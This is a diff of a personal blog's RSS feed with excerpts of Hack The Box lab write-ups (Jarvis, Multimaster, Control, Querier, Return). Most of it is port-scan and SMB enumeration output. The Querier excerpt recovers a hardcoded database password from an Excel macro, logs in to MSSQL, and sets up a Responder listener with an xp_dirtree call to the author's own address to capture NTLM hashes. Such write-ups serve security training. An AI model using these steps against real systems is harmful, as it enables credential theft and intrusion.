@@ -1,1 +1,509 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Service on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/service/</link><description>Recent content in Service on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 25 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/service/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Jarvis</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/jarvis/</link><pubDate>Wed, 25 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/jarvis/</guid><description>Jarvis Enumeration nmap └─$ nmap -Pn -p- 10.10.10.143 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:46 BST Nmap scan report for 10.10.10.143 (10.10.10.143) Host is up (0.21s latency). Not shown: 65478 filtered tcp ports (no-response), 55 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 64999/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds └─$ nmap -Pn -p22,80,64999 -sC -sV 10.</description></item><item><title>[HTB] Machine: Multimaster</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/</guid><description>Multimaster Enumeration nmap └─$ nmap -Pn -p- 10.10.10.179 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST Nmap scan report for 10.10.10.179 (10.10.10.179) Host is up (0.13s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman 49666/tcp open unknown 49667/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49678/tcp open unknown 49698/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 45.</description></item><item><title>[HTB] Machine: Control</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/control/</link><pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/control/</guid><description>Control Enumeration nmap └─$ nmap -Pn -p- 10.10.10.167 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:22 BST Nmap scan report for 10.10.10.167 (10.10.10.167) Host is up (0.11s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 3306/tcp open mysql 49666/tcp open unknown 49667/tcp open unknown └─$ nmap -Pn -p80,135,3306 -sC -sV 10.10.10.167 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:23 BST Nmap scan report for 10.</description></item><item><title>[HTB] Machine: Querier</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</link><pubDate>Wed, 06 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</guid><description>Querier Enumeration nmap └─$ nmap -Pn -p- 10.10.10.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:05 BST Stats: 0:06:52 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 72.17% done; ETC: 03:15 (0:02:39 remaining) Nmap scan report for 10.10.10.125 (10.10.10.125) Host is up (0.15s latency). Not shown: 65521 closed tcp ports (conn-refused) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 5985/tcp open wsman 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 693.</description></item><item><title>[HTB] Machine: Return</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/return/</link><pubDate>Tue, 08 Aug 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/return/</guid><description>Return Enumeration nmap └─$ nmap -p- -Pn 10.10.11.108 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 16:41 BST Stats: 0:05:48 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 62.24% done; ETC: 16:50 (0:03:31 remaining) Warning: 10.10.11.108 giving up on port because retransmission cap hit (6). Stats: 0:14:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.03% done; ETC: 16:56 (0:00:09 remaining) Nmap scan report for 10.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Service on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/service/</link><description>Recent content in Service on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 25 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/service/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Jarvis</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/jarvis/</link><pubDate>Wed, 25 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/jarvis/</guid><description>&lt;h1 id="jarvis">Jarvis&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.143 --min-rate 5000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:46 BST
+Nmap scan report for 10.10.10.143 (10.10.10.143)
+Host is up (0.21s latency).
+Not shown: 65478 filtered tcp ports (no-response), 55 closed tcp ports (conn-refused)
+PORT STATE SERVICE
+22/tcp open ssh
+80/tcp open http
+64999/tcp open unknown
+Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p22,80,64999 -sC -sV 10.10.10.143 --min-rate 5000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:47 BST
+Nmap scan report for 10.10.10.143 (10.10.10.143)
+Host is up (0.24s latency).
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+| 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+| 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+|_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+80/tcp open http Apache httpd 2.4.25 ((Debian))
+|_http-title: Stark Hotel
+|_http-server-header: Apache/2.4.25 (Debian)
+| http-cookie-flags:
+| /:
+| PHPSESSID:
+|_ httponly flag not set
+64999/tcp open http Apache httpd 2.4.25 ((Debian))
+|_http-title: Site doesn&amp;#39;t have a title (text/html).
+|_http-server-header: Apache/2.4.25 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.80 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web server&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/jarvis/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Multimaster</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/</guid><description>&lt;h1 id="multimaster">Multimaster&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.179 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST
+Nmap scan report for 10.10.10.179 (10.10.10.179)
+Host is up (0.13s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp open domain
+80/tcp open http
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+3389/tcp open ms-wbt-server
+5985/tcp open wsman
+49666/tcp open unknown
+49667/tcp open unknown
+49674/tcp open unknown
+49675/tcp open unknown
+49678/tcp open unknown
+49698/tcp open unknown
+Nmap done: 1 IP address (1 host up) scanned in 45.14 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.179 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST
+Nmap scan report for 10.10.10.179 (10.10.10.179)
+Host is up (0.56s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+80/tcp open http Microsoft IIS httpd 10.0
+| http-methods:
+|_ Potentially risky methods: TRACE
+|_http-title: 403 - Forbidden: Access is denied.
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-08 18:52:31Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+445/tcp open Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open mc-nmf .NET Message Framing
+Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: 2h26m16s, deviation: 4h02m30s, median: 6m16s
+| smb-security-mode:
+| account_used: &amp;lt;blank&amp;gt;
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: required
+| smb2-time:
+| date: 2023-10-08T18:52:41
+|_ start_date: 2023-10-08T18:50:58
+| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name: MULTIMASTER
+| NetBIOS computer name: MULTIMASTER\x00
+| Domain name: MEGACORP.LOCAL
+| Forest name: MEGACORP.LOCAL
+| FQDN: MULTIMASTER.MEGACORP.LOCAL
+|_ System time: 2023-10-08T11:52:40-07:00
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.26 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.179
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.179 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web Server&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Control</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/control/</link><pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/control/</guid><description>&lt;h1 id="control">Control&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.167 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:22 BST
+Nmap scan report for 10.10.10.167 (10.10.10.167)
+Host is up (0.11s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT STATE SERVICE
+80/tcp open http
+135/tcp open msrpc
+3306/tcp open mysql
+49666/tcp open unknown
+49667/tcp open unknown
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p80,135,3306 -sC -sV 10.10.10.167 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:23 BST
+Nmap scan report for 10.10.10.167 (10.10.10.167)
+Host is up (0.12s latency).
+PORT STATE SERVICE VERSION
+80/tcp open http Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Fidelity
+| http-methods:
+|_ Potentially risky methods: TRACE
+135/tcp open msrpc Microsoft Windows RPC
+3306/tcp open mysql?
+| fingerprint-strings:
+| NULL, SIPOptions:
+|_ Host &amp;#39;10.10.16.9&amp;#39; is not allowed to connect to this MariaDB server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.94%I=7%D=9/30%Time=6518759C%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,49,&amp;#34;E\0\0\x01\xffj\x04Host\x20&amp;#39;10\.10\.16\.9&amp;#39;\x20is\x20not\x20allowe
+SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&amp;#34;)%r(SIPOptions,49
+SF:,&amp;#34;E\0\0\x01\xffj\x04Host\x20&amp;#39;10\.10\.16\.9&amp;#39;\x20is\x20not\x20allowed\x20
+SF:to\x20connect\x20to\x20this\x20MariaDB\x20server&amp;#34;);
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>mysql&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ mysql -h 10.10.10.167
+ERROR 1130 (HY000): Host &amp;#39;10.10.16.9&amp;#39; is not allowed to connect to this MariaDB server
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>
+&lt;p>Web Server&lt;/p></description></item><item><title>[HTB] Machine: Querier</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</link><pubDate>Wed, 06 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/</guid><description>&lt;h1 id="querier">Querier&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.125 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:05 BST
+Stats: 0:06:52 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 72.17% done; ETC: 03:15 (0:02:39 remaining)
+Nmap scan report for 10.10.10.125 (10.10.10.125)
+Host is up (0.15s latency).
+Not shown: 65521 closed tcp ports (conn-refused)
+PORT STATE SERVICE
+135/tcp open msrpc
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+1433/tcp open ms-sql-s
+5985/tcp open wsman
+47001/tcp open winrm
+49664/tcp open unknown
+49665/tcp open unknown
+49666/tcp open unknown
+49667/tcp open unknown
+49668/tcp open unknown
+49669/tcp open unknown
+49670/tcp open unknown
+49671/tcp open unknown
+Nmap done: 1 IP address (1 host up) scanned in 693.11 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p135,139,445,1433,5985 -sC -sV 10.10.10.125 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:18 BST
+Nmap scan report for 10.10.10.125 (10.10.10.125)
+Host is up (0.13s latency).
+PORT STATE SERVICE VERSION
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+445/tcp open microsoft-ds?
+1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+| 10.10.10.125:1433:
+| Target_Name: HTB
+| NetBIOS_Domain_Name: HTB
+| NetBIOS_Computer_Name: QUERIER
+| DNS_Domain_Name: HTB.LOCAL
+| DNS_Computer_Name: QUERIER.HTB.LOCAL
+| DNS_Tree_Name: HTB.LOCAL
+|_ Product_Version: 10.0.17763
+| ms-sql-info:
+| 10.10.10.125:1433:
+| Version:
+| name: Microsoft SQL Server 2017 RTM
+| number: 14.00.1000.00
+| Product: Microsoft SQL Server 2017
+| Service pack level: RTM
+| Post-SP patches applied: false
+|_ TCP port: 1433
+|_ssl-date: 2023-09-06T19:18:33+00:00; -7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2023-09-06T14:05:43
+|_Not valid after: 2053-09-06T14:05:43
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-time:
+| date: 2023-09-06T19:18:24
+|_ start_date: N/A
+|_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m00s
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled but not required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.61 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.125
+Sharename Type Comment
+--------- ---- -------
+ADMIN$ Disk Remote Admin
+C$ Disk Default share
+IPC$ IPC Remote IPC
+Reports Disk
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;h2 id="footholduser-1">Foothold/User #1&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>//10.10.10.125/Reports&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N //10.10.10.125/Reports
+Try &amp;#34;help&amp;#34; to get a list of possible commands.
+smb: \&amp;gt; ls
+. D 0 Mon Jan 28 23:23:48 2019
+.. D 0 Mon Jan 28 23:23:48 2019
+Currency Volume Report.xlsm A 12229 Sun Jan 27 22:21:34 2019
+5158399 blocks of size 4096. 828878 blocks available
+smb: \&amp;gt; get &amp;#34;Currency Volume Report.xlsm&amp;#34;
+getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (23.7 KiloBytes/sec) (average 23.7 KiloBytes/sec)
+smb: \&amp;gt; exit
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We can use &lt;a href="https://github.com/decalage2/oletools" target="_blank" rel="noopener">oletools&lt;/a> to open &lt;code>xlsm&lt;/code> file&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ olevba &amp;#39;Currency Volume Report.xlsm&amp;#39;
+XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
+olevba 0.60.1 on Python 3.11.4 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Currency Volume Report.xlsm
+Type: OpenXML
+WARNING For now, VBA stomping cannot be detected for files in memory
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls
+in file: xl/vbaProject.bin - OLE stream: &amp;#39;VBA/ThisWorkbook&amp;#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+&amp;#39; macro to pull data for client volume reports
+&amp;#39;
+&amp;#39; further testing required
+Private Sub Connect()
+Dim conn As ADODB.Connection
+Dim rs As ADODB.Recordset
+Set conn = New ADODB.Connection
+conn.ConnectionString = &amp;#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&amp;#34;
+conn.ConnectionTimeout = 10
+conn.Open
+If conn.State = adStateOpen Then
+&amp;#39; MsgBox &amp;#34;connection successful&amp;#34;
+&amp;#39;Set rs = conn.Execute(&amp;#34;SELECT * @@version;&amp;#34;)
+Set rs = conn.Execute(&amp;#34;SELECT * FROM volume;&amp;#34;)
+Sheets(1).Range(&amp;#34;A1&amp;#34;).CopyFromRecordset rs
+rs.Close
+End If
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls
+in file: xl/vbaProject.bin - OLE stream: &amp;#39;VBA/Sheet1&amp;#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(empty macro)
++----------+--------------------+---------------------------------------------+
+|Type |Keyword |Description |
++----------+--------------------+---------------------------------------------+
+|Suspicious|Open |May open a file |
+|Suspicious|Hex Strings |Hex-encoded strings were detected, may be |
+| | |used to obfuscate strings (option --decode to|
+| | |see all) |
++----------+--------------------+---------------------------------------------+
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s connect using &lt;code>impacket-mssqlclient&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ impacket-mssqlclient reporting:&amp;#39;PcwTWTHRwryjc$c6&amp;#39;@10.10.10.125 -windows-auth
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 32576
+[*] INFO(QUERIER): Line 1: Changed database context to &amp;#39;volume&amp;#39;.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="user-2">User #2&lt;/h2>
+&lt;ul>
+&lt;li>Let&amp;rsquo;s enumerate
+&lt;ul>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>SQL&amp;gt; SELECT name FROM master.sys.databases;
+name
+--------------------------------------------------------------------------------------------------------------------------------
+master
+tempdb
+model
+msdb
+volume
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; use volume;
+[*] ENVCHANGE(DATABASE): Old Value: volume, New Value: volume
+[*] INFO(QUERIER): Line 1: Changed database context to &amp;#39;volume&amp;#39;.
+SQL&amp;gt; select * from volume.INFORMATION_SCHEMA.TABLES;
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
+-------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- ----------
+SQL&amp;gt;
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; select name from sys.database_principals;
+name
+--------------------------------------------------------------------------------------------------------------------------------
+public
+dbo
+guest
+INFORMATION_SCHEMA
+sys
+reporting
+db_owner
+db_accessadmin
+db_securityadmin
+db_ddladmin
+db_backupoperator
+db_datareader
+db_datawriter
+db_denydatareader
+db_denydatawriter
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>SQL&amp;gt; SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;);
+entity_name permission_name
+-------------------------------------- ------------------------------------------------------------
+server CONNECT SQL
+server VIEW ANY DATABASE
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We can try &lt;code>Relay attack&lt;/code> to steal &lt;code>NTLM&lt;/code>
+&lt;ul>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server&lt;/a>&lt;/li>
+&lt;li>Spawn &lt;code>responder&lt;/code>
+&lt;ul>
+&lt;li>&lt;code>sudo responder -I tun0&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;code>xp_dirtree '\\10.10.16.9\share'&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Return</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/return/</link><pubDate>Tue, 08 Aug 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/return/</guid><description>&lt;h1 id="return">Return&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -p- -Pn 10.10.11.108 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 16:41 BST
+Stats: 0:05:48 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 62.24% done; ETC: 16:50 (0:03:31 remaining)
+Warning: 10.10.11.108 giving up on port because retransmission cap hit (6).
+Stats: 0:14:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 99.03% done; ETC: 16:56 (0:00:09 remaining)
+Nmap scan report for 10.10.11.108 (10.10.11.108)
+Host is up (0.12s latency).
+Not shown: 65483 closed tcp ports (conn-refused), 28 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp open domain
+80/tcp open http
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+5985/tcp open wsman
+9389/tcp open adws
+47001/tcp open winrm
+49664/tcp open unknown
+49665/tcp open unknown
+49666/tcp open unknown
+49667/tcp open unknown
+49671/tcp open unknown
+49674/tcp open unknown
+49675/tcp open unknown
+49679/tcp open unknown
+49682/tcp open unknown
+49694/tcp open unknown
+64731/tcp open unknown
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -sC -sV -Pn 10.10.11.108
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:52 BST
+Nmap scan report for 10.10.11.108 (10.10.11.108)
+Host is up (0.19s latency).
+Not shown: 990 closed tcp ports (conn-refused)
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+80/tcp open http Microsoft IIS httpd 10.0
+|_http-title: HTB Printer Admin Panel
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_ Potentially risky methods: TRACE
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-09 18:11:46Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+445/tcp open microsoft-ds?
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
